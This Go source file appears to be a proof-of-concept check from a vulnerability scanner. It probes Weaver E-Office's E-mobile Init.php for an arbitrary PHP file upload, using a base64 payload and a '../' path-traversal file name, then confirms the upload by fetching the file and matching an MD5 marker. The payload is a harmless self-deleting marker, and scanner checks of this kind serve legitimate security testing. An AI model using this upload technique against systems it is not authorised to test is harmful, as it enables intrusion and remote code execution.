package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func E_Office_E_mobileAppinit_upload(u string) bool {
	str := pkg.RandomStr()
	filename := str + ".php"
	url := u + "/E-mobile/App/Init.php?m=createDo_Email&upload_file=PD9waHAgZWNobyBtZDUoMjMzKTt1bmxpbmsoX19GSUxFX18pPz4=&file_name=../" + filename
	if req, err := pkg.HttpRequset(url, "GET", "", false, nil); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 {
			if req2, err := pkg.HttpRequset(u+"/attachment/"+filename, "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "e165421110ba03099a1c0393373c5b43") {
					pkg.GoPocLog(fmt.Sprintf("Found vuln E_Office_E_mobileAppinit_upload|%s\n", url))
					return true
				}
			}
		}

	}
	return false
}
